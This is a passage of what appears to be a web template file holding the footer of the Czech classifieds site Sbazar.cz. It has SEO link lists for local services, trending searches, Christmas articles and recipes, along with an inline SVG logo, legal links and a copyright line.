                                            pohotovost</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.firmy.cz/Prvni-pomoc-a-zdravotnictvi/Zdravotnicke-sluzby/Veterinarni-pece/Veterinarni-pohotovosti"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Veterina
                                            pohotovost</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.firmy.cz/Auto-moto/Auto-moto-sluzby/Autoservisy"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Autoservis</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.firmy.cz/Prvni-pomoc-a-zdravotnictvi/Prodejci-zdravotnickeho-zbozi-a-leciv/Zdravotnicke-potreby"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Zdravotnické
                                            potřeby</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.firmy.cz/Remesla-a-sluzby/Uklidove-a-cistici-sluzby/Dezinfekce-dezinsekce-deratizace"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Dezinfekce</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.firmy.cz/Remesla-a-sluzby/Remesla/Zamecnictvi"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Zámečnictví</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.firmy.cz/Auto-moto/Auto-moto-sluzby/Autoservisy/Pneuservisy"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Pneuservis</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.firmy.cz/Remesla-a-sluzby/Polygraficke-sluzby/Copycentra"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Copy
                                            centra</a></li>
                                </ul>
                            </div>
                            <div class="c-footer__seo-menu"><h5 class="c-footer__seo-menu-title">Co teď letí</h5>
                                <ul class="c-footer__seo-links">
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sbazar.cz/800-koronavirus-pomoc"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Koronavirus
                                            - pomoc druhým</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.sbazar.cz/170-osobni-auta"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Auta</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sbazar.cz/hledej/playstation%204"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Playstation
                                            4</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.sbazar.cz/237-iphone"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Použité levné
                                            iphony</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sbazar.cz/hledej/Octavia%20RS/152-skoda"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Octavia
                                            RS</a></li>
                                    <li class="c-footer__seo-menu-item"><a href="https://www.sbazar.cz/416-golfky"
                                                                           class="c-footer__seo-menu-link"
                                                                           target="_blank"
                                                                           rel="noopener noreferrer">Golfky</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sbazar.cz/33-starozitnosti-hobby-umeni"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Starožitnosti</a>
                                    </li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.sbazar.cz/hledej/za%20odvoz"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vše za odvoz</a></li>
                                </ul>
                            </div>
                        </div>
                        <div class="c-footer__seo-horizontal">
                            <div class="c-footer__seo-menu"><h5 class="c-footer__seo-menu-title">Vánoce</h5>
                                <ul class="c-footer__seo-links">
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.novinky.cz/vanoce/clanek/oteviraci-doba-a-svatky-kde-nakoupite-na-stedry-den-ale-i-na-silvestra-ci-novy-rok-40345747"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Otevírací
                                            doba Štědrý den</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.seznamzpravy.cz/clanek/advent-82437"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Advent</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.seznamzpravy.cz/clanek/vanoce-tradice-zvyky-82605"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vánoční
                                            tradice</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.prozeny.cz/clanek/nejlepsi-vanocni-filmy-60432"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vánoční
                                            filmy</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.novinky.cz/vanoce/clanek/jake-pohadky-budou-v-televizi-na-stedry-den-40345638"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">TV
                                            program na Vánoce</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.seznamzpravy.cz/p/vysledky-voleb/2021/parlamentni-volby/rozdeleni-kresel"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Rozložení
                                            sněmovny</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.prozeny.cz/clanek/vanocni-hvezda-jak-se-o-ni-starat-aby-vydrzela-do-svatku-51906"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vánoční
                                            hvězda</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.novinky.cz/vanoce/clanek/blizi-se-advent-vyrobte-si-doma-adventni-venec-40342835"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Adventní
                                            věnec</a></li>
                                </ul>
                            </div>
                            <div class="c-footer__seo-menu"><h5 class="c-footer__seo-menu-title">Recepty</h5>
                                <ul class="c-footer__seo-links">
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.prozeny.cz/clanek/tradicni-bramborovy-salat-s-majonezou-40488"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Bramborový
                                            salát</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.prozeny.cz/clanek/kureci-veprove-rizky-recept-60713"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Nejlepší
                                            řízek</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.novinky.cz/vanoce/clanek/kapr-na-stedrovecernim-stole-nejlepsi-recepty-na-klasiku-i-novou-inspiraci-40345861"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Kapr</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.prozeny.cz/clanek/vanilkove-rohlicky-ktere-bude-chtit-kazdy-mame-dokonaly-recept-8516"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Vanilkové
                                            rohlíčky</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.novinky.cz/vanoce/clanek/tradicni-linecke-cukrovi-podle-receptu-z-rodinneho-cukrarstvi-40304900"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Linecké
                                            cukroví</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.prozeny.cz/clanek/vonave-pernicky-hned-mekke-59684"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Měkké
                                            perníčky</a></li>
                                    <li class="c-footer__seo-menu-item"><a
                                                href="https://www.prozeny.cz/clanek/nejlepsi-vanocni-cukrovi-59531"
                                                class="c-footer__seo-menu-link" target="_blank"
                                                rel="noopener noreferrer">Nejlepší
                                            cukroví</a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="c-footer__seznam-box">
                        <div class="c-footer__logo-part">
                            <svg class="c-logo-seznam c-footer__logo-seznam" viewBox="0 0 330 67"
                                 xmlns="http://www.w3.org/2000/svg"><title>Sbazar.cz</title>
                                <path class="c-logo-seznam__s c-footer__logo-seznam__s"
                                      d="M32.42 3.63c-1.9.3-3.73.68-5.55 1.06-1.22.23-2.43.54-3.65.84-1.14.3-2.28.53-3.34.91-1.07.31-2.13.69-3.12 1.07-1.98.76-3.88 1.9-5.55 3.27-.99.83-1.98 1.74-2.74 2.88-.53.76-.98 1.53-1.44 2.36-.46.76-.69 1.75-.69 2.66 0 2.66 1.68 4.94 3.65 6.62.61.53 1.3 1.06 1.98 1.52 2.05 1.44 4.26 2.66 6.54 3.8 2.35 1.14 4.71 2.2 7.07 3.19 2.28.99 4.56 1.75 6.92 2.58.68.23 1.36.46 1.97.69 2.13.68 4.26 1.37 6.39 2.13 1.29.45 2.66.91 3.95 1.52 1.37.61 2.74 1.21 3.95 2.13.84.6 1.52 1.29 1.98 2.12.53.84.84 1.83.84 2.74 0 .91-.23 1.83-.76 2.66-1.3 2.05-3.58 3.42-5.78 4.41-3.27 1.37-6.62 2.59-10.04 3.57-1.97.61-3.87 1.14-5.85 1.68-.59.16-5.34 1.43-5.93 1.59-1.98.53-3.95.99-5.93 1.37-1.14.23-2.28.46-3.42.76-.2.05-1.85.41-2.05.46-1.45.3-2.81.61-4.26.91-1.6.38-3.27.68-4.86 1.06-.46.08-.92.23-1.45.31-.45.07-1.97.45-.83.38 1.59-.08 6-.46 15.28-1.75 3.34-.53 6.76-1.06 10.11-1.6 4.18-.68 8.36-1.52 12.54-2.51 1.21-.3 2.36-.6 3.57-.91.23-.07 2.05-.61 2.28-.68 3.27-.99 8.52-2.81 9.73-3.35 4.72-2.05 7.68-3.65 9.2-7.37.53-1.29.76-2.81.61-4.26-.15-1.29-.61-2.58-1.29-3.72-.69-1.07-1.52-1.98-2.44-2.89-1.74-1.6-3.65-2.89-5.7-3.95-.61-.31-1.14-.61-1.75-.84-.76-.38-1.52-.68-2.28-.99-1.06-.45-2.13-.83-3.27-1.22-2.81-.98-5.7-1.82-8.59-2.81-1.59-.53-3.19-1.14-4.78-1.75-.69-.3-1.3-.6-1.98-.91-.76-.38-1.52-.76-2.21-1.21-.91-.54-2.35-1.45-1.97-2.74.3-.91 1.29-1.29 2.05-1.6.76-.3 1.52-.53 2.28-.68 2.36-.61 4.79-.99 7.15-1.52.68-.15 1.37-.31 2.13-.46 1.82-.45 3.8-.76 5.54-1.44 1.52-.61 3.5-1.6 4.03-3.2.84-2.43-.07-5.09-1.44-7.14-.46-.76-.99-1.45-1.45-2.21-.68-.98-1.44-1.9-2.2-2.81-.3-.45-.76-.38-1.14-.3-.61.15-1.82 1.59-12.01 3.57"></path>
                                <path class="c-logo-seznam__eznam c-footer__logo-seznam__eznam"
                                      d="M186.51 28.03l.15-.3.15-.31.15-.22.16-.23.07-.23.08-.15.07-.15.08-.08.23-.46.15-.22.15-.23.38-.61.23-.3.23-.38.08-.08h.07l.15.08.08.07.15.15.23.31.23.45.3.61.31.76.3.91.08.16.07.22.15.31.16.45v.16l.07.22.08.16v.6l-.15.16-.08.07-.23.08-.23.07-.3.08h-.3l-1.9.15h-1.91l-.22-.07-.16-.08-.15-.08-.07-.07-.08-.15v-.31l.08-.23.15-.22.15-.23.15-.23.15-.15.08-.15.08-.16.15-.15m-12.09 9.35c1.07.31 1.6.99.76 1.98-.23.3-.45.61-.68.99-.02.03-.14.27-.15.3-.16.31-.31.53-.31.91v.16c.08.45.46.98.69 1.36.45.84.98 1.6 1.59 2.36.08.15 1.29-1.9 1.45-2.05.45-.61.98-1.14 1.44-1.75.61-.76 1.22-1.44 2.05-1.98.84-.45 1.75-.68 2.74-.76.91-.07 1.9-.15 2.81-.23 1.9-.07 3.88-.3 5.78-.53.76-.07 1.82-.23 2.51.08.68.38 1.14.99 1.67 1.52.61.61 1.22 1.29 1.75 1.98.68.76 1.29 1.59 2.05 2.35.46.46.99.84 1.52 1.29.03.02.28.14.31.16.98.45 1.59-.16 1.82-1.14.31-1.45-.53-2.82-1.14-4.03-.38-.69-.68-1.37-.99-1.98-.23-.53-.53-1.44-.07-1.98.38-.38 1.14-.45 1.59-.53.61-.15 1.14-.3 1.75-.45 1.14-.23 2.36-.54 3.57-.69.69-.07 1.75-.61 2.36 0 .76.76 0 2.21-.23 3.04-.45 1.37-.99 2.74-1.14 4.18-.15 1.3.15 2.74.99 3.73.61.76 1.67 1.44 2.59.83.76-.45 1.29-1.36 1.67-2.2.61-1.52 1.06-3.12 1.59-4.64.46-1.37.92-2.81 1.45-4.18.38-.99.83-1.97 1.21-3.04.23-.68.61-1.29.84-1.9.23-.53.31-1.22.84-1.6.68-.38 1.44.76 1.75 1.22.6.76 1.14 1.6 1.67 2.36.61.83 1.14 2.05 2.13 2.51 1.67.83 3.19-1.14 4.1-2.21.69-.76 1.29-1.52 1.98-2.28.68-.76 1.44-1.6 2.13-2.36.45-.53 1.06-1.52 1.82-1.52.69 0 .84.69.84 1.22.3 2.51.38 5.02.76 7.53l.45 2.73c.14.78.22 1.21.23 1.3.15.6.23 1.21.38 1.82.31 1.29.61 2.58.99 3.8.3 1.06.76 2.2 1.67 2.97 1.07.91 2.97.6 3.58-.61.15-.23.22-.61.22-.84.16-.61.08-1.22 0-1.9-.15-2.2-.76-4.33-.83-6.54 0-.91.07-1.82.15-2.73.15-2.13.46-4.26.53-6.39.15-2.58.38-5.32-.38-7.83-.23-.76-.53-1.44-.91-2.05-.31-.61-.76-1.14-1.22-1.6-.45-.53-.99-.99-1.67-1.29-.61-.3-1.37-.53-1.98-.61-1.59-.07-3.27.84-4.48 1.75-1.07.76-2.05 1.67-2.97 2.66-1.59 1.75-3.26 3.5-4.63 5.4-.38.53-.92 1.52-1.75 1.44-.99-.15-1.52-1.59-1.83-2.43-.3-.76-.6-1.44-.98-2.21-.14-.27-1.24-2.46-1.37-2.73-.38-.76-.69-1.6-1.3-2.21-.6-.76-1.44-1.06-2.35-1.36-.61-.23-1.52-.46-2.21-.08-.83.53-.68 1.75-.76 2.58-.07.76-.15 1.45-.22 2.13-.16 1.75-.31 3.58-.69 5.25-.15.76-.45 1.75-1.06 2.2-.54.38-1.14.31-1.75.38h-1.45c-1.14 0-2.2-.07-3.34-.07-.91 0-1.9.07-2.81.15-.84 0-1.68.15-2.51.15-.99.08-2.13.23-3.04-.23-.69-.3-1.07-1.06-1.37-1.75-.46-.98-.99-1.9-1.6-2.81-.45-.83-.99-1.67-1.44-2.43-.69-1.14-1.45-2.36-2.13-3.5-.46-.76-.99-1.52-1.44-2.28-.38-.61-.92-1.44-1.68-1.67-.68-.23-1.29.23-1.44.84-.08.45 0 .83-.08 1.29-.07.45-.3.91-.45 1.29-.38.84-.84 1.67-1.37 2.43-1.67 2.66-2.97 5.55-4.41 8.29-.3.53-.61.99-.84 1.52-.38.68-.61 1.29-1.44 1.52-.76.23-1.6.08-2.36.3-.91.23-1.21 1.07-1.37 1.9-.15.76-.15 1.52-.3 2.28-.08.54-.23 1.14-.15 1.68 0 0 .27.06.3.07zM71.11 52.66c-.76 0-1.52.15-2.28.15-.91-.07-1.44-.6-1.82-1.36-.38-.99-.61-2.06-.84-3.04-.23-.92-.38-1.91-.3-2.89.07-.54.15-.92.61-1.3.68-.53 1.59-.22 2.35-.6.61-.38.84-1.14.91-1.83.08-1.14 0-2.35-.07-3.5-.15-2.96 0-5.92-.38-8.89-.08-.68-.31-1.44-1.07-1.67-1.44-.38-1.52-1.9-1.59-3.12-.08-.76-.08-1.75.23-2.51.45-.99 1.59-1.52 2.58-1.9.99-.3 1.98-.61 2.96-.83.99-.31 2.06-.46 3.05-.61.31-.05 2.87-.41 3.19-.46 1.06-.15 2.05-.3 3.12-.38.98-.07 1.97-.23 2.96-.3 1.14-.08 2.28-.15 3.42-.15 1.06-.08 2.05 0 3.12 0 1.06 0 2.05.07 3.04.07 1.06 0 2.13.15 3.11.23 1.53.23 2.97.46 4.26 1.29 1.37.91 2.21 2.74.91 4.03-1.36 1.37-3.49 1.14-5.24 1.14-1.45 0-2.89 0-4.26.08-1.37.07-2.73.15-4.1.3-1.3.08-2.59.15-3.8.31-1.3.07-2.66.22-3.96.38-1.06.07-2.13.22-3.11.38-.84.15-1.9.3-2.59.98-.45.46-.53 1.3-.3 1.9.38 1.22 2.2.92 3.19.84 2.2-.08 4.33-.46 6.54-.61.99-.07 1.97-.07 2.96-.15 1.22-.08 2.44-.08 3.65-.08 1.07.08 2.13.16 3.12.38 1.29.23 2.43.76 3.65 1.3 1.52.53 1.29 2.43.99 3.65-.16.6-.31 1.21-.92 1.59-1.29.84-3.19.61-4.63.61-1.45.08-2.89.15-4.34.3-2.28.23-4.48.46-6.76.69-1.37.15-2.74.38-4.11.53-.91.08-2.13 0-2.89.68-.01.01-.06.07-.15.16l-.07.07-.08.15c-.05.1-.07.15-.08.16-.07.61-.68 2.51-.07 2.96.01.01.06.03.15.08h.23c.76 0 1.52-.08 2.28-.08 1.14-.07 2.28-.07 3.42-.23 2.2-.15 4.41-.38 6.61-.53 1.45-.15 2.89-.23 4.41-.3 2.21-.23 4.33-.31 6.54-.38 1.29-.08 2.58 0 3.8-.61 1.44-.61 2.66-1.75 4.03-2.51 1.75-.91 3.57-1.75 5.4-2.58 2.2-1.07 4.33-2.28 6.61-3.27 1.75-.76 3.5-1.52 5.17-2.28.84-.38 1.67-.69 2.51-1.14.53-.31 1.97-.99 1.59-1.9-.15-.46-.76-.54-1.21-.54-1.67-.22-5.78.08-8.36.54-4.11.68-4.72 1.29-5.86.15-.83-.91-.68-2.28-.53-3.42.15-1.22.68-2.97 1.06-3.42 1.22-1.6 5.1-1.75 6.92-1.9.91-.08 1.9-.08 2.89-.08 1.37 0 2.66.08 4.03.08.34.02 3.08.2 3.42.22 1.29.16 2.74.16 4.03.61.38.15.84.31 1.22.46 1.29.61 2.5 1.44 3.42 2.58.53.69.91 1.45 1.06 2.28.08.38.15.84.08 1.22-.08.3-.15.91-.31 1.14 0 .01-.07.07-.07.08-.15.38-.53.76-.84 1.06-1.52 1.37-3.8 1.9-5.7 2.66-.91.38-1.82.84-2.74 1.22-2.58 1.14-5.09 2.35-7.75 3.42-2.13.91-4.33 1.82-6.39 2.89-.53.3-1.36.76-1.74 1.29-.31.61.38.61.91.61s1.06 0 1.59-.08c.48-.04 4.31-.41 4.79-.46 1.6-.15 3.27-.3 4.87-.53 1.52-.23 3.04-.38 4.56-.53 1.67-.15 3.27-.23 4.94-.23 1.67 0 3.35 0 4.94.31.02 0 .09.03.23.07h.46c.68 0 1.44-.07 1.82-.76.61-1.14.91-2.51 1.37-3.72.53-1.6 1.06-3.12 1.67-4.64.08-.23.15-.46.23-.61.61-1.75 1.29-3.49 1.98-5.24.3-.69.53-1.37.76-2.13.15-.53.22-1.07.53-1.6.45-.83 1.21-1.37 2.05-.76.68.46 1.14 1.37 1.6 2.05.38.76.76 1.52.98 2.44.23.83 0 1.67-.3 2.43-.3.84-.61 1.67-.84 2.58-.45 1.9 1.37 3.35 2.74 4.19 1.29.76 2.74 1.29 4.11 1.9.98.45 2.05.91 3.11 1.06.69.15 1.45.23 2.06-.15.91-.69 1.21-1.98 1.52-3.04.38-1.3.68-2.59.91-3.88.23-1.06.38-2.2.53-3.27.08-.83.15-1.75.23-2.58.07-1.14 0-2.21-.08-3.35 0-.76.15-1.67.61-2.2.68-.76 1.82-.38 2.36.38l.23.23c.3.53.6 1.21.76 1.82.3 1.14.53 2.28.6 3.5.08.99.16 1.9.23 2.89.15 3.34-.15 6.69-.53 10.03-.23 1.82-.61 3.5-.99 5.32-.23.99-.38 1.98-.84 2.89-.3.61-.68 1.14-1.06 1.67-.23.23-.46.46-.68.61-.92.61-2.13.53-3.12.46-1.44-.16-2.81-.54-4.18-.99-.84-.31-1.67-.61-2.51-1.07-.84-.38-1.67-.83-2.51-1.29-.83-.45-1.59-.99-2.36-1.52-.76-.53-1.44-1.06-2.05-1.75-.53-.53-.99-1.29-1.44-1.9-.53-.61-.99-.83-1.29 0-.23.53-.31 1.14-.46 1.75-.23 1.07-.53 2.05-.84 3.04-.3.99-1.59 3.73-3.04 2.43-.45-.38-.83-.91-1.52-.91-.68 0-1.37.31-2.05.46-.76.15-1.44.23-2.2.38-1.37.3-2.82.61-4.19.91-.91.15-1.82.3-2.81.46-.91.15-1.82.3-2.66.38-.91.15-1.82.3-2.81.38-1.45.15-2.89.38-4.33.53-1.15.15-2.29.3-3.5.38-.99.08-1.9.23-2.89.3-1.6.16-3.19.31-4.87.38-2.43.08-5.01.23-7.37-.22-.53-.08-1.37-.16-1.75-.61-.3-.31-.07-.76-.3-1.07v-.07l-.08-.08-.07-.08-.08-.07h-.23l-.07.07-.16.08-.53-.15-.23.15-.15.15-.07.15c-.05.14-.08.22-.08.23-.53 1.68-2.28 2.36-3.88 2.51-1.72.2-10.31 1.22-25.77 3.04m240.91-13.07c-3.43.23-6.62.83-10.04.45-1.14-.07-3.04-.22-3.95-.83-2.74-1.83 6.84-5.02 8.06-5.48 3.34-1.21 10.03-3.11 10.03-3.11s6.31-1.6 6.54-4.94c.23-4.11-4.03-6.01-7.22-7-1.37-.3-2.66-.53-4.03-.68-.92-.08-1.83-.15-2.82-.15-1.74-.08-3.42.07-5.16.3-1.75.23-5.55.3-6.16 2.58-.31 1.14-1.6 3.5-.46 4.57 1.14 1.06 3.04.6 4.41.53 1.98-.23 3.88-.53 5.78-.76 1.44-.15 3.27-.46 4.48.61 1.45 1.29-2.35 2.5-3.11 2.88-2.89 1.22-5.93 2.13-8.82 3.35-2.74 1.14-5.48 2.2-8.14 3.5-1.21.6-2.35 1.29-3.49 1.97-.04-.02-.22-.15-.53-.38l-3.35.38c-2.01.19-3.12.29-3.34.31-2.28.15-4.49.22-6.77.38-1.14.07-2.89.07-3.8-.76-1.98-1.83-.84-4.41.46-6.16 1.36-1.9 3.34-3.35 5.39-4.56 1.37-.84 2.89-1.52 4.41-1.98 1.07-.3 2.13-.61 3.19-.76.16.31.31.61.54.91.07.16 2.58-.91 2.81-.98.76-.38 1.82-1.22 1.9-2.21 0-1.22-.99-2.36-1.9-2.96-1.07-.69-2.21-.92-3.42-.92-1.29 0-2.66.08-3.95.23-.92.15-1.83.31-2.74.61-1.45.46-2.89.99-4.26 1.75-1.82.99-3.5 2.35-4.94 3.8-.68.68-1.29 1.52-1.75 2.36-.68 1.06-1.14 2.28-1.52 3.42-.99 3.27-.68 7.37.76 10.49.99 2.13 2.59 3.95 4.64 5.24 2.51 1.6 5.78 2.06 8.67 1.52 1.21-.23 2.28-.53 3.42-.99 1.21-.45 2.35-.83 3.49-1.52.23-.15 2.59-1.44 2.74-1.29.38.46.61 1.07.99 1.52.38.46.83.84 1.37 1.22.98.76 2.12 1.06 3.26 1.14 2.97.38 6.09.53 9.05.61 2.43 0 4.87-.15 7.22-.38 1.52-.16 3.12-.38 4.64-.54 3.95-.45 7.22-1.36 11.48-3.19 1.98-.91 3.27-2.13 4.03-3.04-.46-.3-.99-.53-1.45-.76-3.11-1.22-6.61-1.29-9.96-.91-1.52.23-3.04.3-4.56.46-.83.07-1.44.07-2.12.15m-52.53 3.49c0-.6 0-1.14-.23-1.59-.46-1.14-1.67-2.36-2.89-2.59-1.14-.23-2.43 0-3.35.69-.45.38-.98.99-1.29 1.59-.53 1.3-.53 3.12.31 4.26 1.37 1.9 4.33 1.9 5.93.38.83-.68 1.36-1.6 1.52-2.74"></path>
                            </svg>
                        </div>
                        <div class="c-footer__links-part">
                            <ul class="c-footer__links">
                                <li class="c-footer__item"><a class="c-footer__link"
                                                              href="https://napoveda.seznam.cz/cz/smluvni-podminky/podminky-sbazar-cz"
                                                              rel="noreferrer" target="_blank">Smluvní podmínky</a></li>
                                <li class="c-footer__item"><a class="c-footer__link"
                                                              href="https://seznam.cz/ochranaudaju"
                                                              rel="noreferrer" target="_blank">Ochrana údajů</a></li>
                                <li class="c-footer__item"><a class="c-footer__link"
                                                              href="https://www.seznam.cz">Seznam.cz</a></li>
                                <li class="c-footer__item"><a class="c-footer__link"
                                                              href="https://www.seznam.cz/reklama/cz/obsahovy-web/sluzba-sbazar"
                                                              rel="noreferrer" target="_blank">Reklama</a></li>
                            </ul>
                            <p class="c-footer__copyright">Copyright © 1996–2022 Seznam.cz, a.s.</p></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
@endsection